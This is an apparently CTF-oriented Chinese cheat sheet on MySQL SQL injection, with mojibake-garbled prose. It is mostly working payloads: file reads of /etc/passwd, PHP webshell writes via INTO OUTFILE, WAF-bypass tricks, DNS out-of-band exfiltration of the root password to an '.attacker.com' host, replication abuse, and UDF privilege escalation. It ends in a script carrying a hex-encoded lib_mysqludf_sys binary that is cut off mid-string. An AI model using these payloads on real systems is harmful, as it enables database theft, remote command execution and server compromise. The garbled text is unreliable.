äºŒæ¬¡æ³¨å…¥æ”»å‡»è€…æ„é€ çš„æ¶æ„æ•°æ®å­˜å‚¨åˆ°æ•°æ®åº“åï¼Œæ¶æ„æ•°æ®è¢«è¯»å–å¹¶è¿›å…¥åˆ°SQLæŸ¥è¯¢è¯­å¥æ‰€å¯¼è‡´çš„æ³¨å…¥ã€‚ ç°åœ¨é€šå¸¸Webåº”ç”¨ç¨‹åºå¤§å¤šéƒ½ä¼šè¿›è¡Œå‚æ•°è¿‡æ»¤ï¼Œæ¥é˜²æ­¢æ³¨å…¥ã€‚å¦‚æœæŸå¤„ä½¿ç”¨äº†urldecode()æˆ–è€… rawurldecode()å‡½æ•°ï¼Œåˆ™ä¼šå¯¼è‡´äºŒæ¬¡è§£ç ç”Ÿæˆå•å¼•å·äºŒå¼•å‘æ³¨å…¥ï¼Œå³äºŒæ¬¡æ³¨å…¥ã€‚ Webåº”ç”¨ç¨‹åºé€šå¸¸ä½¿ç”¨addslashes() ã€mysql_real_escape_string()ã€mysql_escape_string()å‡½æ•°æˆ–è€…å¼€å¯GPCæ¥é˜²æ­¢æ³¨å…¥ï¼Œä¹Ÿå°±æ˜¯ç»™å•å¼•å·(â€˜â€™)ã€åŒå¼•å·(â€œâ€)ã€åæ–œæ ()å’ŒNULLåŠ ä¸Šåæ–œæ è½¬ä¹‰ã€‚ addslasheså‡½æ•°è™½ç„¶åœ¨è¿‡æ»¤ä¹‹åä¼šæ·»åŠ  â€œ\\â€ è¿›è¡Œè½¬ä¹‰ï¼Œä½†æ˜¯ â€œ\\â€ å¹¶ä¸ä¼šè¢«å¸¦åˆ°æ•°æ®åº“ä¸­ äºŒæ¬¡urldecodeæ³¨å…¥å•å¼•å·ï¼š%25%27 åŒå¼•å·ï¼š%25%22 æ–‡ä»¶æ“ä½œè¯»æ–‡ä»¶ï¼š SELECT LOAD_FILE(&#39;/etc/passwd&#39;) SELECT LOAD_FILE(0x2f666c6167) å†™æ–‡ä»¶ï¼š SELECT &#39;&lt;?php phpinfo();?&gt;&#39; into outfile &#39;/var/www/html/phpinfo.php&#39; select version() into outfile &quot;/var/www/html/test.php&quot; LINES TERMINATED BY 0x16è¿›åˆ¶æ–‡ä»¶ â€‹ Rogue Mysql Serveræ­å»ºæ¶æ„mysqlæœåŠ¡å™¨è¯»å–æ–‡ä»¶ã€‚ https://github.com/allyshka/Rogue-MySql-Server â€‹ QuineQuineåˆå«åšè‡ªäº§ç”Ÿç¨‹åºï¼Œåœ¨sqlæ³¨å…¥æŠ€æœ¯ä¸­ï¼Œè¿™æ˜¯ä¸€ç§ä½¿å¾—è¾“å…¥çš„sqlè¯­å¥å’Œè¾“å‡ºçš„sqlè¯­å¥ä¸€è‡´çš„æŠ€æœ¯ï¼Œå¸¸ç”¨äºä¸€äº›ç‰¹æ®Šçš„ç™»é™†ç»•è¿‡sqlæ³¨å…¥ä¸­ã€‚ å‚è€ƒï¼šä»ä¸‰é“èµ›é¢˜å†è°ˆQuine trick 12345SELECT REPLACE(REPLACE(&#x27;REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)&#x27;,CHAR(34),CHAR(39)),CHAR(46),&#x27;REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)&#x27;);1&#x27;UNION(SELECT(REPLACE(REPLACE(&#x27;1&quot;UNION(SELECT(REPLACE(REPLACE(&quot;%&quot;,CHAR(34),CHAR(39)),CHAR(37),&quot;%&quot;)))#&#x27;,CHAR(34),CHAR(39)),CHAR(37),&#x27;1&quot;UNION(SELECT(REPLACE(REPLACE(&quot;%&quot;,CHAR(34),CHAR(39)),CHAR(37),&quot;%&quot;)))#&#x27;)))#-- CHAR =&gt; 0x â€‹ ç»•è¿‡ï¼ˆbypassï¼‰ç©ºæ ¼ å¤šå±‚æ‹¬å·åµŒå¥— æ”¹ç”¨+å· ä½¿ç”¨æ³¨é‡Šä»£æ›¿ï¼ˆ/*æ³¨é‡Šå†…å®¹*/ã€/*! MYSQLä¸“å±*/ï¼‰ and/oråé¢å¯ä»¥è·Ÿä¸Šå¶æ•°ä¸ª!ã€~å¯ä»¥æ›¿ä»£ç©ºæ ¼ï¼Œä¹Ÿå¯ä»¥æ··åˆä½¿ç”¨(è§„å¾‹åˆä¸åŒ)ï¼Œand/orå‰çš„ç©ºæ ¼å¯ç”¨çœç•¥ %09, %0a, %0b, %0c, %0d, %a0ç­‰éƒ¨åˆ†ä¸å¯è§å­—ç¬¦å¯ä¹Ÿä»£æ›¿ç©ºæ ¼ å•åŒå¼•å· éœ€è¦è·³å‡ºå•å¼•å·çš„æƒ…å†µï¼šå°è¯•æ˜¯å¦å­˜åœ¨ç¼–ç é—®é¢˜è€Œäº§ç”Ÿçš„SQLæ³¨å…¥ã€‚ ä¸éœ€è¦è·³å‡ºå•å¼•å·çš„æƒ…å†µï¼šå­—ç¬¦ä¸²å¯ç”¨16è¿›åˆ¶è¡¨ç¤ºã€ä¹Ÿå¯é€šè¿‡è¿›åˆ¶è½¬æ¢å‡½æ•°è¡¨ç¤ºæˆå…¶ä»–è¿›åˆ¶ã€‚ 1234-- hex ç¼–ç SELECT * FROM Users WHERE username = 0x61646D696E-- char() å‡½æ•°SELECT * FROM Users WHERE username = CHAR(97, 100, 109, 105, 110) é€—å· é‡‡ç”¨ substr((database())from(&#123;&#125;)for(1)) çš„å½¢å¼ é‡‡ç”¨joinï¼šunion select * from ((select 1)a join (select 2)b join (select 3)c); ç­‰å· like ç”¨regexpæˆ–è€…in &lt;&gt; and / or åŒå†™ananddã€oorr ä½¿ç”¨è¿ç®—ç¬¦ä»£æ›¿&amp;&amp;ã€|| ç›´æ¥æ‹¼æ¥=å·ï¼Œå¦‚ï¼š?id=1=(condition) å…¶ä»–æ–¹æ³•ï¼Œå¦‚ï¼š?id=1^(condition)ã€?id=1)xor(condition) union ç›²æ³¨ï¼š&#39;and(select pass from users limit 1)=&#39;secret select æœ‰æ–‡ä»¶è¯»å–æƒé™ 12&#x27; and substr(load_file(&#x27;file&#x27;),locate(&#x27;DocumentRoot&#x27;,(load_file(&#x27;file&#x27;)))+length(&#x27;DocumentRoot&#x27;),10)=&#x27;a&#x27;=&#x27;&#x27; into outfile &#x27;/var/www/dump.txt è·å–åˆ—å 123&#x27; and åˆ—å is not null#&#x27; procedure analyse()#&#x27;and substr(pass,1,1)=&#x27;a /*ä½¿ç”¨substræ¥åšè¿‡æ»¤æ¡ä»¶*/ handlerè¯­å¥ä»£æ›¿selectæŸ¥è¯¢ 1234567/*é€šè¿‡handlerè¯­å¥æŸ¥è¯¢usersè¡¨çš„å†…å®¹*/handler users open as yunensec; /*æŒ‡å®šæ•°æ®è¡¨è¿›è¡Œè½½å…¥å¹¶å°†è¿”å›å¥æŸ„é‡å‘½å*/handler yunensec read first; /*è¯»å–æŒ‡å®šè¡¨/å¥æŸ„çš„é¦–è¡Œæ•°æ®*/handler yunensec read next; /*è¯»å–æŒ‡å®šè¡¨/å¥æŸ„çš„ä¸‹ä¸€è¡Œæ•°æ®*/handler yunensec read next; /*è¯»å–æŒ‡å®šè¡¨/å¥æŸ„çš„ä¸‹ä¸€è¡Œæ•°æ®*/...handler yunensec close; /*å…³é—­å¥æŸ„*/ limit123&#x27;and(select pass from users where id=1)=&#x27;a&#x27;and(select pass from users group by id having id=1)=&#x27;a&#x27;and length((select pass from users having substr(pass,1,1)=&#x27;a&#x27;)) where join/left join/right join...on... information_schema æ›¿ä»£è¡¨ï¼šsys.x$schema_flattened_keys ã€sys.schema_table_statistics as database() =&gt; schema() if case when å…¶ä»–å…³é”®å­— åŒå†™ç»•è¿‡å…³é”®å­—è¿‡æ»¤ ä½¿ç”¨åŒä¹‰å‡½æ•°/è¯­å¥ä»£æ›¿ï¼Œå¦‚ifå‡½æ•°å¯ç”¨case when condition then 1 else 0 endè¯­å¥ä»£æ›¿ã€‚ ä½¿ç”¨ CONCAT() æ—¶ï¼Œä»»ä½•ä¸ªå‚æ•°ä¸º nullï¼Œå°†è¿”å› nullï¼Œæ¨èä½¿ç”¨ CONCAT_WS()ã€‚CONCAT_WS()å‡½æ•°ç¬¬ä¸€ä¸ªå‚æ•°è¡¨ç¤ºç”¨å“ªä¸ªå­—ç¬¦é—´éš”æ‰€æŸ¥è¯¢çš„ç»“æœã€‚ 1234 SELECT &#x27;a&#x27; &#x27;d&#x27; &#x27;mi&#x27; &#x27;n&#x27;;SELECT CONCAT(&#x27;a&#x27;, &#x27;d&#x27;, &#x27;m&#x27;, &#x27;i&#x27;, &#x27;n&#x27;); SELECT CONCAT_WS(&#x27;&#x27;, &#x27;a&#x27;, &#x27;d&#x27;, &#x27;m&#x27;, &#x27;i&#x27;, &#x27;n&#x27;);SELECT GROUP_CONCAT(&#x27;a&#x27;, &#x27;d&#x27;, &#x27;m&#x27;, &#x27;i&#x27;, &#x27;n&#x27;); æ‹¬å· order by å¤§å°æ¯”è¾ƒç›²æ³¨ æ•°å­— ç”¨trueæ¢1 12def cal(x): return (&#x27;(&#x27;+&#x27;(true)+&#x27;*x)[:-1]+&#x27;)&#x27; æ›¿æ¢è¡¨ ä»£æ›¿å­—ç¬¦ æ•° ä»£æ›¿å­—ç¬¦ æ•° ä»£æ›¿å­—ç¬¦ æ•° æ•° ä»£æ›¿å­—ç¬¦ falseã€!pi() 0 ceil(pi()*pi()) 10 A ceil((pi()+pi())*pi()) 20 K trueã€!(!pi()) 1 ceil(pi()*pi())+true 11 B ceil(ceil(pi())*version()) 21 L true+true 2 ceil(pi()+pi()+version()) 12 C ceil(pi()*ceil(pi()+pi())) 22 M floor(pi())ã€~~pi() 3 floor(pi()*pi()+pi()) 13 D ceil((pi()+ceil(pi()))*pi()) 23 N ceil(pi()) 4 ceil(pi()*pi()+pi()) 14 E ceil(pi())*ceil(version()) 24 O floor(version()) //æ³¨æ„ç‰ˆæœ¬ 5 ceil(pi()*pi()+version()) 15 F floor(pi()*(version()+pi())) 25 P ceil(version()) 6 floor(pi()*version()) 16 G floor(version()*version()) 26 Q ceil(pi()+pi()) 7 ceil(pi()*version()) 17 H ceil(version()*version()) 27 R floor(version()+pi()) 8 ceil(pi()*version())+true 18 I ceil(pi()*pi()*pi()-pi()) 28 S floor(pi()*pi()) 9 floor((pi()+pi())*pi()) 19 J floor(pi()*pi()*floor(pi())) 29 T mysqlç³»ç»Ÿåº“123456#æŸ¥è¯¢æ‰€æœ‰éç³»ç»Ÿè‡ªå¸¦æ•°æ®åº“ã€è¡¨ã€åˆ—select table_schema,table_name,column_name from information_schema.columns where table_schema not in (&#x27;sys&#x27;,&#x27;mysql&#x27;,&#x27;information_schema&#x27;,&#x27;performance_schema&#x27;)#æŸ¥è¯¢æŒ‡å®šåº“çš„è¡¨select group_concat(table_name) from mysql.innodb_table_stats where database_name=database()select group_concat(table_name) from sys.schema_auto_increment_columns where table_schema=database() sysç³»ç»Ÿåº“12345678910111213141516171819#æŸ¥è¯¢æ‰€æœ‰çš„åº“ï¼šSELECT table_schema FROM sys.schema_table_statistics GROUP BY table_schema;SELECT table_schema FROM sys.x$schema_flattened_keys GROUP BY table_schema;#æŸ¥è¯¢æŒ‡å®šåº“çš„è¡¨ï¼ˆè‹¥æ— åˆ™è¯´æ˜æ­¤è¡¨ä»æœªè¢«è®¿é—®ï¼‰ï¼šSELECT table_name FROM sys.schema_table_statistics WHERE table_schema=&#x27;mspwd&#x27; GROUP BY table_name;SELECT table_name FROM sys.x$schema_flattened_keys WHERE table_schema=&#x27;mspwd&#x27; GROUP BY table_name;#ç»Ÿè®¡æ‰€æœ‰è®¿é—®è¿‡çš„è¡¨æ¬¡æ•°:åº“å,è¡¨å,è®¿é—®æ¬¡æ•°select table_schema,table_name,sum(io_read_requests+io_write_requests) io from sys.schema_table_statistics group by table_schema,table_name order by io desc;#æŸ¥çœ‹æ‰€æœ‰æ­£åœ¨è¿æ¥çš„ç”¨æˆ·è¯¦ç»†ä¿¡æ¯:è¿æ¥çš„ç”¨æˆ·(è¿æ¥çš„ç”¨æˆ·å,è¿æ¥çš„ip),å½“å‰åº“,ç”¨æˆ·çŠ¶æ€(Sleepå°±æ˜¯ç©ºé—²),ç°åœ¨åœ¨æ‰§è¡Œçš„sqlè¯­å¥,ä¸Šä¸€æ¬¡æ‰§è¡Œçš„sqlè¯­å¥,å·²ç»å»ºç«‹è¿æ¥çš„æ—¶é—´(ç§’)SELECT user,db,command,current_statement,last_statement,time FROM sys.session;#æŸ¥çœ‹æ‰€æœ‰æ›¾è¿æ¥æ•°æ®åº“çš„IP,æ€»è¿æ¥æ¬¡æ•°SELECT host,total_connections FROM sys.host_summary;#æŸ¥çœ‹è¯­å¥çš„æ‰§è¡Œè®°å½•SELECT * from sys.x$statement_analysis; æ— åˆ—åæ³¨å…¥ï¼ˆor / column è¢«è¿‡æ»¤ï¼‰12345select group_concat(`2`) from (select 1,2,3 union select * from user)x;select `2` from (select 1,2,3 union select * from user)x limit 1,1;select ((select 1,&#x27;ae&#x27;,0)&gt;(select * from user));union all select * from (select * from users as a join users b using(id,username))c--+extractvalue(1,concat(0x7e,(select*from (select*from output a join output b)c)))# åŒæ­¥è¡¨æ•°æ® - ä¸»ä»å¤åˆ¶æŸ¥çœ‹æ•°æ®åº“ç‰ˆæœ¬ï¼šselect version(); åœ¨è‡ªå·±vpsä¸Šèµ·ä¸€ä¸ªç›¸åŒç‰ˆæœ¬çš„mariadbï¼Œä¿®æ”¹é»˜è®¤é…ç½®æ–‡ä»¶ vim /etc/mysql/my.cnf å…è®¸è¿œç¨‹è®¿é—®å¹¶å¯ ç”¨äºŒè¿›åˆ¶æ—¥å¿—ï¼š 12server-id = 1log_bin = /var/log/mysql/mariadb-bin service mysql restart è‡ªå·±çš„vpsä½œä¸ºä¸»ï¼Œé¢˜ç›®ç¯å¢ƒä½œä¸ºä»ã€‚ä¸»æœåŠ¡å™¨æ‰§è¡Œï¼š 123CREATE USER &#x27;atest&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;testtest&#x27;;grant replication slave on . to &#x27;atest&#x27;@&#x27;%&#x27;;flush privileges; ä½¿ç”¨ select database(); show tables; desc game; ç­‰æŸ¥è¯¢å‘½ä»¤æŸ¥çœ‹ä»æœåŠ¡å™¨ä¸Šçš„è¡¨ç»“æ„ï¼Œå°†ä»æœåŠ¡å™¨ä¸Šçš„æ•°æ®åº“ç»“æ„ä¸€æ¯”ä¸€å¤åˆ»åˆ°ä¸»æœåŠ¡å™¨ä¸Šï¼š 123CREATE DATABASE IF NOT EXISTS game_data;use game_dataCREATE TABLE IF NOT EXISTS game ( round int(20) , choice varchar(256) ) ; åœ¨ä¸»æœåŠ¡å™¨mysqlä¸­æ‰§è¡Œï¼šshow master status; è®°å½•ä¸‹æ¥ Fileå’Œ Positionï¼šmysql-bin.000001 1376 åœ¨ä»æœåŠ¡å™¨(é¢˜ç›®ç¯å¢ƒ)æ‰§è¡Œï¼š CHANGE MASTER TO MASTER_HOST=&#39;ä¸»æœåŠ¡å™¨ip&#39;, MASTER_USER=&#39;atest&#39;, MASTER_PASSWORD=&#39;testtest&#39;, MASTER_LOG_FILE=&#39;mariadb-bin.000001(è®°å½•çš„å€¼)&#39;, MASTER_LOG_POS=1365(è®°å½•çš„å€¼); æ˜¾ç¤ºä¸‹é¢è¿™ä¸ªè¡¨ç¤ºæˆåŠŸè¿æ¥ä¸Šï¼š 12start slave;show slave status; ä¸»æœåŠ¡å™¨ä¸­æ‰§è¡Œï¼šINSERT INTO game ( round , choice ) VALUES (&#39;1&#39;, &#39;R&#39;), (&#39;2&#39;, &#39;R&#39;),(&#39;3&#39;, &#39;R&#39;), (&#39;4&#39;, &#39;R&#39;),(&#39;5&#39;, &#39;R&#39;), (&#39;6&#39;, &#39;R&#39;),(&#39;7&#39;,&#39;R&#39;), (&#39;8&#39;, &#39;R&#39;),(&#39;9&#39;, &#39;R&#39;), (&#39;10&#39;, &#39;R&#39;); æ’å…¥ä»æœåŠ¡å™¨è¡¨æ•°æ®æˆåŠŸã€‚ å‚è€ƒï¼šSYCTF 2023 - Confronting robots å‚è€ƒæ–‡https://xz.aliyun.com/t/7169 â€‹ DNSå¸¦å¤–æ³¨å…¥ï¼ˆOOBï¼‰out-of-bandå¸¦å¤–æ•°æ®ï¼ˆOOBï¼‰ä¸inbandç›¸åï¼Œå®ƒæ˜¯ä¸€ç§é€šè¿‡å…¶ä»–ä¼ è¾“æ–¹å¼æ¥çªƒå–æ•°æ®çš„æŠ€æœ¯ï¼ˆä¾‹å¦‚åˆ©ç”¨DNSè§£æåè®®å’Œç”µå­é‚®ä»¶ï¼‰ã€‚OOBæŠ€æœ¯é€šå¸¸éœ€è¦æ˜“å—æ”»å‡»çš„å®ä½“ç”Ÿæˆå‡ºç«™TCP/UDP/ICMPè¯·æ±‚ï¼Œç„¶åå…è®¸æ”»å‡»è€…æ³„éœ²æ•°æ®ã€‚OOBæ”»å‡»çš„æˆåŠŸåŸºäºå‡ºå£é˜²ç«å¢™è§„åˆ™ï¼Œå³æ˜¯å¦å…è®¸æ¥è‡ªæ˜“å—æ”»å‡»çš„ç³»ç»Ÿå’Œå¤–å›´é˜²ç«å¢™çš„å‡ºç«™è¯·æ±‚ã€‚è€Œä»åŸŸåæœåŠ¡å™¨ï¼ˆDNSï¼‰ä¸­æå–æ•°æ®ï¼Œåˆ™è¢«è®¤ä¸ºæ˜¯æœ€éšè”½æœ‰æ•ˆçš„æ–¹æ³•ã€‚ åˆ©ç”¨åŸç†ï¼š åˆ©ç”¨æ¡ä»¶ï¼š éœ€è¦Windowsç¯å¢ƒ 1ã€DBMSä¸­éœ€è¦æœ‰å¯ç”¨çš„ï¼Œèƒ½ç›´æ¥æˆ–é—´æ¥å¼•å‘DNSè§£æè¿‡ç¨‹çš„å­ç¨‹åºï¼Œå³ä½¿ç”¨åˆ°UNC 2ã€Linuxæ²¡æœ‰UNCè·¯å¾„ï¼Œæ‰€ä»¥å½“å¤„äºLinuxç¯å¢ƒï¼Œä¸èƒ½ä½¿ç”¨è¯¥æ–¹å¼è·å–æ•°æ® å·¥å…·ï¼š DNSLog.cn CEYE 123456789#secure_file_privæŒ‡å®šæ–‡ä»¶å¤¹æˆ–ä¸ºç©ºï¼ˆæ²¡æœ‰è®¾ç½®ï¼‰ï¼ˆmysql&gt;5.5.53é»˜è®¤nullï¼Œç¦ç”¨å¯¼å…¥å¯¼å‡ºï¼‰#æŸ¥è¯¢secure_file_privselect @@secure_file_priv;select @@global.secure_file_priv;show variables like &quot;secure_file_priv&quot;;#æ³¨å…¥SELECT LOAD_FILE(CONCAT(&#x27;\\\\\\\\&#x27;,(SELECT password FROM mysql.user WHERE user=&#x27;root&#x27; LIMIT 1),&#x27;.attacker.com\\\\foobar&#x27;));select load_file(concat(0x5c5c5c5c,(select database()),0x2E62383862306437653533326238663635333164322E642E7A6861636B2E63615C5C612E747874)); â€‹ UDFUDFæ˜¯mysqlçš„ä¸€ä¸ªæ‹“å±•æ¥å£ï¼ŒUDFï¼ˆUserdefined functionï¼‰å¯ç¿»è¯‘ä¸ºç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ï¼Œè¿™ä¸ªæ˜¯ç”¨æ¥æ‹“å±•Mysqlçš„æŠ€æœ¯æ‰‹æ®µã€‚å½“æˆ‘ä»¬æœ‰è¯»å–å’Œå†™å…¥æƒé™ä»¥åï¼Œæˆ‘ä»¬å°±å¯ä»¥å°è¯•ä½¿ç”¨UDFææƒçš„æ–¹æ³•ï¼Œä»æ•°æ®åº“çš„rootæƒé™æå‡åˆ°ç³»ç»Ÿçš„ç®¡ç†å‘˜æƒé™ã€‚ å‚è€ƒï¼š Mysql UDF ææƒ MySQL UDFææƒåå…­è¿›åˆ¶æŸ¥è¯¢ 123456789show variables like &#x27;%plugin%&#x27;;# é€šå¸¸æ˜¯/usr/lib/mysql/plugin/select unhex(&#x27;udf.soçš„åå…­è¿›åˆ¶&#x27;) into dumpfile&#x27;/usr/lib/mysql/plugin/mysqludf.so&#x27;;create function sys_eval returns string soname &#x27;mysqludf.so&#x27;;select sys_eval(&#x27;whoami&#x27;); 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#å‚è€ƒè„šæœ¬#ç¯å¢ƒï¼šLinux/MariaDBimport requestsurl=&#x27;http://15700a19-71aa-4c90-b3ca-b6db9d77c56d.chall.ctf.show/api/?id=&#x27;code=&#x27;7F454C4602010100000000000000000003003E0001000000800A000000000000400000000000000058180000000000000000000040003800060040001C0019000100000005000000000000000000000000000000000000000000000000000000C414000000000000C41400000000000000002000000000000100000006000000C814000000000000C814200000000000C8142000000000004802000000000000580200000000000000002000000000000200000006000000F814000000000000F814200000000000F814200000000000800100000000000080010000000000000800000000000000040000000400000090010000000000009001000000000000900100000000000024000000000000002400000000000000040000000000000050E574640400000044120000000000004412000000000000441200000000000084000000000000008400000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000040000001400000003000000474E5500D7FF1D94176ABA0C150B4F3694D2EC995AE8E1A8000000001100000011000000020000000700000080080248811944C91CA44003980468831100000013000000140000001600000017000000190000001C0000001E000000000000001F00000000000000200000002100000022000000230000002400000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED971581CA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF3B9FD4A0AD73D1C50B5911FEAB5FBE1200000000000000000000000000000000000000000000000000000000000000000300090088090000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000CD00000012000000000000000000000000000000000000001E0100001200000000000000000000000000000000000000620100001200000000000000000000000000000000000000E30000001200000000000000000000000000000000000000B90000001200000000000000000000000000000000000000680100001200000000000000000000000000000000000000160000002200000000000000000000000000000000000000540000001200000000000000000000000000000000000000F00000001200000000000000000000000000000000000000B200000012000000000000000000000000000000000000005A01000012000000000000000000000000000000000000005201000012000000000000000000000000000000000000004C0100001200000000000000000000000000000000000000E800000012000B00D10D000000000000D1000000000000003301000012000B00A90F0000000000000A000000000000001000000012000C00481100000000000000000000000000007800000012000B009F0B0000000000004C00000000000000FF0000001200090088090000000000000000000000000000800100001000F1FF101720000000000000000000000000001501000012000B00130F0000000000002F000000000000008C0100001000F1FF201720000000000000000000000000009B00000012000B00480C0000000000000A000000000000002501000012000B00420F0000000000006700000000000000AA00000012000B00520C00000000000063000000000000005B00000012000B00950B0000000000000A000000000000008E00000012000B00EB0B0000000000005D00000000000000790100001000F1FF101720000000000000000000000000000501000012000B00090F0000000000000A00000000000000C000000012000B00B50C000000000000F100000000000000F700000012000B00A20E00000000000067000000000000003900000012000B004C0B0000000000004900000000000000D400000012000B00A60D0000000000002B000000000000004301000012000B00B30F0000000000005501000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F696E6974006D656D637079006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F007379735F6765745F696E6974007379735F6765745F6465696E6974007379735F67657400676574656E76007374726C656E007379735F7365745F696E6974006D616C6C6F63007379735F7365745F6465696E69740066726565007379735F73657400736574656E76007379735F657865635F696E6974007379735F657865635F6465696E6974007379735F657865630073797374656D007379735F6576616C5F696E6974007379735F6576616C5F6465696E6974007379735F6576616C00706F70656E007265616C6C6F63007374726E6370790066676574730070636C6F7365006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E3500000000000000000000020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001006F0100001000000000000000751A6909000002009101000000000000F0142000000000000800000000000000F0142000000000007816200000000000060000000200000000000000000000008016200000000000060000000300000000000000000000008816200000000000060000000A0000000000000000000000A81620000000000007000000040000000000000000000000B01620000000000007000000050000000000000000000000B81620000000000007000000060000000000000000000000C01620000000000007000000070000000000000000000000C81620000000000007000000080000000000000000000000D01620000000000007000000090000000000000000000000D816200000000000070000000A0000000000000000000000E016200000000000070000000B0000000000000000000000E816200000000000070000000C0000000000000000000000F016200000000000070000000D0000000000000000000000F816200000000000070000000E00000000000000000000000017200000000000070000000F00000000000000000000000817200000000000070000001000000000000000000000004883EC08E8EF000000E88A010000E8750700004883C408C3FF35F20C2000FF25F40C20000F1F4000FF25F20C20006800000000E9E0FFFFFFFF25EA0C20006801000000E9D0FFFFFFFF25E20C20006802000000E9C0FFFFFFFF25DA0C20006803000000E9B0FFFFFFFF25D20C20006804000000E9A0FFFFFFFF25CA0C20006805000000E990FFFFFFFF25C20C20006806000000E980FFFFFFFF25BA0C20006807000000E970FFFFFFFF25B20C20006808000000E960FFFFFFFF25AA0C20006809000000E950FFFFFFFF25A20C2000680A000000E940FFFFFFFF259A0C2000680B000000E930FFFFFFFF25920C2000680C000000E920FFFFFF4883EC08488B05ED0B20004885C07402FFD04883C408C390909090909090909055803D680C2000004889E5415453756248833DD00B200000740C488D3D2F0A2000E84AFFFFFF488D1D130A20004C8D25040A2000488B053D0C20004C29E348C1FB034883EB014839D873200F1F4400004883C0014889051D0C200041FF14C4488B05120C20004839D872E5C605FE0B2000015B415CC9C3660F1F84000000000048833DC009200000554889E5741A488B054B0B20004885C0740E488D3DA7092000C9FFE00F1F4000C9C39090554889E54883EC3048897DE8488975E0488955D8488B45E08B0085C07421488D0DE7050000488B45D8BA320000004889CE4889C7E89BFEFFFFC645FF01EB04C645FF000FB645FFC9C3554889E548897DF8C9C3554889E54883EC3048897DF8488975F0488955E848894DE04C8945D84C894DD0488D0DCA050000488B45E8BA1F0000004889CE4889C7E846FEFFFF488B45E048C7001E000000488B45E8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F801751C488B45F0488B40088B0085C0750E488B45F8C60001B800000000EB20488D0D83050000488B45E8BA2B0000004889CE4889C7E8DFFDFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC4048897DE8488975E0488955D848894DD04C8945C84C894DC0488B45E0488B4010488B004889C7E8BBFDFFFF488945F848837DF8007509488B45C8C60001EB16488B45F84889C7E84BFDFFFF4889C2488B45D0488910488B45F8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F8027425488D0D05050000488B45E8BA1F0000004889CE4889C7E831FDFFFFB801000000E9AB000000488B45F0488B40088B0085C07422488D0DF2040000488B45E8BA280000004889CE4889C7E8FEFCFFFFB801000000EB7B488B45F0488B40084883C004C70000000000488B45F0488B4018488B10488B45F0488B40184883C008488B00488D04024883C0024889C7E84BFCFFFF4889C2488B45F848895010488B45F8488B40104885C07522488D0DA4040000488B45E8BA1A0000004889CE4889C7E888FCFFFFB801000000EB05B800000000C9C3554889E54883EC1048897DF8488B45F8488B40104885C07410488B45F8488B40104889C7E811FCFFFFC9C3554889E54883EC3048897DE8488975E0488955D848894DD0488B45E8488B4010488945F0488B45E0488B4018488B004883C001480345F0488945F8488B45E0488B4018488B10488B45E0488B4010488B08488B45F04889CE4889C7E8EFFBFFFF488B45E0488B4018488B00480345F0C60000488B45E0488B40184883C008488B10488B45E0488B40104883C008488B08488B45F84889CE4889C7E8B0FBFFFF488B45E0488B40184883C008488B00480345F8C60000488B4DF8488B45F0BA010000004889CE4889C7E892FBFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0DC2020000488B45D8BA2B0000004889CE4889C7E81EFBFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC2048897DF8488975F0488955E848894DE0488B45F0488B4010488B004889C7E882FAFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0D22020000488B45D8BA2B0000004889CE4889C7E87EFAFFFFB801000000C9C3554889E548897DF8C9C3554889E54881EC500400004889BDD8FBFFFF4889B5D0FBFFFF488995C8FBFFFF48898DC0FBFFFF4C8985B8FBFFFF4C898DB0FBFFFFBF01000000E8BEF9FFFF488985C8FBFFFF48C745F000000000488B85D0FBFFFF488B4010488B00488D352C0200004889C7E852FAFFFF488945E8EB63488D85E0FBFFFF4889C7E8BDF9FFFF488945F8488B45F8488B55F04801C2488B85C8FBFFFF4889D64889C7E80CFAFFFF488985C8FBFFFF488D85E0FBFFFF488B55F0488B8DC8FBFFFF4801D1488B55F84889C64889CFE8D1F9FFFF488B45F8480145F0488B55E8488D85E0FBFFFFBE000400004889C7E831F9FFFF4885C07580488B45E84889C7E850F9FFFF488B85C8FBFFFF0FB60084C0740A4883BDC8FBFFFF00750C488B85B8FBFFFFC60001EB2B488B45F0488B95C8FBFFFF488D0402C60000488B85C8FBFFFF4889C7E8FBF8FFFF488B95C0FBFFFF488902488B85C8FBFFFFC9C39090909090909090554889E5534883EC08488B05A80320004883F8FF7419488D1D9B0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E84FF9FFFF4883C408C300004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F29000000000000006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E33000045787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D6574657200000000000045787065637465642065786163746C792074776F20617267756D656E74730000457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279007200011B033B800000000F00000008F9FFFF9C00000051F9FFFFBC0000005BF9FFFFDC000000A7F9FFFFFC00000004FAFFFF1C0100000EFAFFFF3C01000071FAFFFF5C01000062FBFFFF7C0100008DFB